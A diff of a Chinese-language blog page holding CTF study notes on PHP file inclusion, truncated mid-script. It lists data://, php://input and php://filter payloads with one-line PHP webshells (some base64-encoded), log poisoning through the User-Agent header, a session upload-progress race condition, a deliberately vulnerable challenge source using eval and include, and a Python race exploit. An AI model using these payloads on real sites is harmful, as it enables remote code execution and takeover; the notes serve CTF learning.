@@ -20,20 +20,29 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# 文件包含漏洞  有include,require_once()包含一次,对软连接操作存在缺陷,超过20此就可以再次包含  ### 伪协议  ![image.png](&#x2F;yuque-notes&#x2F;02-Knowledge Book&#x2F;assets&#x2F;f6b39220-image.png)  1. 变量&#x3D;php:&#x2F;&#x2F;input+一句话木马 2. 变量&#x3D;file:&#x2F;&#x2F;文件地址 3. 变量&#x3D;php:&#x2F;&#x2F;f">
+  <meta name="description" content="有include,require_once()包含一次,对软连接操作存在缺陷,超过20此就可以再次包含 伪协议 1. 变量&#x3D;php:&#x2F;&#x2F;input+一句话木马 2. 变量&#x3D;file:&#x2F;&#x2F;文件地址 3. 变量&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件包含漏洞">
 <meta property="og:url" content="http://example.com/2026/09/16/58-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# 文件包含漏洞  有include,require_once()包含一次,对软连接操作存在缺陷,超过20此就可以再次包含  ### 伪协议  ![image.png](&#x2F;yuque-notes&#x2F;02-Knowledge Book&#x2F;assets&#x2F;f6b39220-image.png)  1. 变量&#x3D;php:&#x2F;&#x2F;input+一句话木马 2. 变量&#x3D;file:&#x2F;&#x2F;文件地址 3. 变量&#x3D;php:&#x2F;&#x2F;f">
+<meta property="og:description" content="有include,require_once()包含一次,对软连接操作存在缺陷,超过20此就可以再次包含 伪协议 1. 变量&#x3D;php:&#x2F;&#x2F;input+一句话木马 2. 变量&#x3D;file:&#x2F;&#x2F;文件地址 3. 变量&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/f6b39220-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/26e100ba-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/c47d9952-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/ba877bdf-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/978872a9-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/e6988301-B15550097176222209253F82F04FF271.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/ff3fead6-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/bc54e32b-image.png">
 <meta property="article:published_time" content="2026-09-16T14:21:34.000Z">
 <meta property="article:modified_time" content="2026-09-16T14:21:34.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
+<meta property="article:tag" content="PHP">
 <meta property="article:tag" content="Web安全">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/f6b39220-image.png">
 
 <link rel="canonical" href="http://example.com/2026/09/16/58-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
 
@@ -235,6 +244,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">有include,require_once()包含一次,对软连接操作存在缺陷,超过20此就可以再次包含 伪协议 1. 变量=php://input+一句话木马 2. 变量=file://文件地址 3. 变量=php://filter/convert.base64-encode/resource=文件…</div>
 
         </div>
       </header>
@@ -245,97 +255,56 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# 文件包含漏洞
-
-有include,require_once()包含一次,对软连接操作存在缺陷,超过20此就可以再次包含
-
-### 伪协议
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/f6b39220-image.png)
-
-1. 变量=php://input+一句话木马
-2. 变量=file://文件地址
-3. 变量=php://filter/convert.base64-encode/resource=文件名(/flag,根目录下)
-4. 变量= php://filter/convert.iconv.utf8.utf16/resource=文件名//绕过base64
-5. data数据流: ?page=data://text/plain, <?php @eval($_POST[1]);?> 一句话木马
-6. ?page=data://text/plain,<?php system(‘whoami’);?> 系统命令执行
-7. ?page=data://text/plain,<?php system('tac fla?.php');?>
-8. 也可以将后面<?php @eval($_POST[1]);?> 进行base64编码
-9. ?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==木马
-10. ?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg== base64的意思是<?php system('tac flag.php');?>
-
-php://filter/read=convert.base64-encode/resource=[文件名]
-
-1. phar://伪协议
-这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压 ?file=phar://压缩包/内部文件
-2. file_put_contents(“1.php”,“<?php eval($_POST[‘shell’]); ?>”);
-
-# php://filter,convert.iconv
-
-> convert.iconv.<input-encoding>.<output-encoding>orconvert.iconv.<input-encoding>/<output-encoding>
-
-<input-encoding>和<output-encoding> 就是编码方式，有如下几种：
-
+        <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>有include,require_once()包含一次,对软连接操作存在缺陷,超过20此就可以再次包含</p>
+<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p><img src="/yuque-notes/02-Knowledge%20Book/assets/f6b39220-image.png" alt="image.png"></p>
+<ol>
+<li>变量&#x3D;php:&#x2F;&#x2F;input+一句话木马</li>
+<li>变量&#x3D;file:&#x2F;&#x2F;文件地址</li>
+<li>变量&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件名(&#x2F;flag,根目录下)</li>
+<li>变量&#x3D; php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf8.utf16&#x2F;resource&#x3D;文件名&#x2F;&#x2F;绕过base64</li>
+<li>data数据流: ?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, <?php @eval($_POST[1]);?> 一句话木马</li>
+<li>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system(‘whoami’);?> 系统命令执行</li>
+<li>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac fla?.php');?></li>
+<li>也可以将后面<?php @eval($_POST[1]);?> 进行base64编码</li>
+<li>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs&#x2F;Pg&#x3D;&#x3D;木马</li>
+<li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D; base64的意思是<?php system('tac flag.php');?></li>
+</ol>
+<p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]</p>
+<ol>
+<li>phar:&#x2F;&#x2F;伪协议<br>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压 ?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件</li>
+<li>file_put_contents(“1.php”,“<?php eval($_POST[‘shell’]); ?>”);</li>
+</ol>
+<h1 id="php-filter-convert-iconv"><a href="#php-filter-convert-iconv" class="headerlink" title="php:&#x2F;&#x2F;filter,convert.iconv"></a>php:&#x2F;&#x2F;filter,convert.iconv</h1><blockquote>
+<p>convert.iconv.<input-encoding>.<output-encoding>orconvert.iconv.<input-encoding>&#x2F;<output-encoding></p>
+</blockquote>
+<p><input-encoding>和<output-encoding> 就是编码方式，有如下几种：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">UCS-<span class="number">4</span>*</span><br><span class="line">UCS-<span class="number">4</span>BE</span><br><span class="line">UCS-<span class="number">4</span>LE*</span><br><span class="line">UCS-<span class="number">2</span></span><br><span class="line">UCS-<span class="number">2</span>BE</span><br><span class="line">UCS-<span class="number">2</span>LE</span><br><span class="line">UTF-<span class="number">32</span>*</span><br><span class="line">UTF-<span class="number">32</span>BE*</span><br><span class="line">UTF-<span class="number">32</span>LE*</span><br><span class="line">UTF-<span class="number">16</span>*</span><br><span class="line">UTF-<span class="number">16</span>BE*</span><br><span class="line">UTF-<span class="number">16</span>LE*</span><br><span class="line">UTF-<span class="number">7</span></span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-<span class="number">8</span>*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br></pre></td></tr></table></figure>
 
-# 包含日志文件 进行getshell
-
-日志文件路径： ?file=/var/log/nginx/access.log
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/26e100ba-image.png)
-
-上传后用burpsuite抓包
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/c47d9952-image.png)
-
-在UA头植入一句话木马
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/ba877bdf-image.png)
-
-服务器即相应报错,可以蚁剑连接,也可以直接用密码文件包含
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/978872a9-image.png)
-
+<h1 id="包含日志文件-进行getshell"><a href="#包含日志文件-进行getshell" class="headerlink" title="包含日志文件 进行getshell"></a>包含日志文件 进行getshell</h1><p>日志文件路径： ?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/26e100ba-image.png" alt="image.png"></p>
+<p>上传后用burpsuite抓包</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/c47d9952-image.png" alt="image.png"></p>
+<p>在UA头植入一句话木马</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/ba877bdf-image.png" alt="image.png"></p>
+<p>服务器即相应报错,可以蚁剑连接,也可以直接用密码文件包含</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/978872a9-image.png" alt="image.png"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-这种情况使用data伪协议,就会自动闭合,相当于把.php注释掉了
-
-# session条件竞争文件包含
-
-## 利用场景
-
-当存在一个文件包含漏洞但找不到可以包含恶意文件时候
-
-## 判断及原理
-
-phpinfo();
-
-![B15550097176222209253F82F04FF271.png](/yuque-notes/02-Knowledge Book/assets/e6988301-B15550097176222209253F82F04FF271.png)
-
-当选项为on,加入Cookie带了SESSION_UPLAOD_PROGRESS
-这个选项原本是代表你上传文件的进度的，就比如你上传文件到服务器百分之五十、百分之七十这样的进度条
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/ff3fead6-image.png)
-
-这个是文件的路径,这时候会在/tmp目录下生成一个/tmp/sess_xxx的文件xxx就是你自己设置的PHPSESSID的名字,文件的内容就会包含SESSION_UPLOAD_PROGRESS这个cookie的值
-由于这个文件存活时间很短，所以我们需要一直上传文件来保持他的存活，这就是条件竞争
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/bc54e32b-image.png)
-
-当这个选项关闭时我们可以直接进行文件上传,当这个选项开启时,我们就需要进行条件竞争.
-
-## 题目复现及exp
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这种情况使用data伪协议,就会自动闭合,相当于把.php注释掉了</p>
+<h1 id="session条件竞争文件包含"><a href="#session条件竞争文件包含" class="headerlink" title="session条件竞争文件包含"></a>session条件竞争文件包含</h1><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>当存在一个文件包含漏洞但找不到可以包含恶意文件时候</p>
+<h2 id="判断及原理"><a href="#判断及原理" class="headerlink" title="判断及原理"></a>判断及原理</h2><p>phpinfo();</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/e6988301-B15550097176222209253F82F04FF271.png" alt="B15550097176222209253F82F04FF271.png"></p>
+<p>当选项为on,加入Cookie带了SESSION_UPLAOD_PROGRESS<br>这个选项原本是代表你上传文件的进度的，就比如你上传文件到服务器百分之五十、百分之七十这样的进度条</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/ff3fead6-image.png" alt="image.png"></p>
+<p>这个是文件的路径,这时候会在&#x2F;tmp目录下生成一个&#x2F;tmp&#x2F;sess_xxx的文件xxx就是你自己设置的PHPSESSID的名字,文件的内容就会包含SESSION_UPLOAD_PROGRESS这个cookie的值<br>由于这个文件存活时间很短，所以我们需要一直上传文件来保持他的存活，这就是条件竞争</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/bc54e32b-image.png" alt="image.png"></p>
+<p>当这个选项关闭时我们可以直接进行文件上传,当这个选项开启时,我们就需要进行条件竞争.</p>
+<h2 id="题目复现及exp"><a href="#题目复现及exp" class="headerlink" title="题目复现及exp"></a>题目复现及exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;pop&#x27;</span> <span class="comment">#之前上传时自拟的名字</span></span><br><span class="line">url1 = <span class="string">&quot;http://node4.anna.nssctf.cn:28710/&quot;</span></span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)  <span class="comment">#文件名，随便改就行</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(): <span class="comment">#上传文件竞争过程</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data1 = &#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat /n*;echo findit;&#x27;)?&gt;&quot;</span><span class="comment">#修改rce的命令</span></span><br><span class="line">        &#125;</span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">&quot;file&quot;</span>: <span class="string">&quot;/tmp/sess_pop&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span>:<span class="string">&quot;eval&quot;</span>,</span><br><span class="line">            <span class="string">&quot;shell&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = session.post(url1+<span class="string">&quot;index.php&quot;</span>, data=data1, files=file, cookies=cookies,params=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;findit&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">evnet=threading.Event()       <span class="comment">#开启线程</span></span><br><span class="line"><span 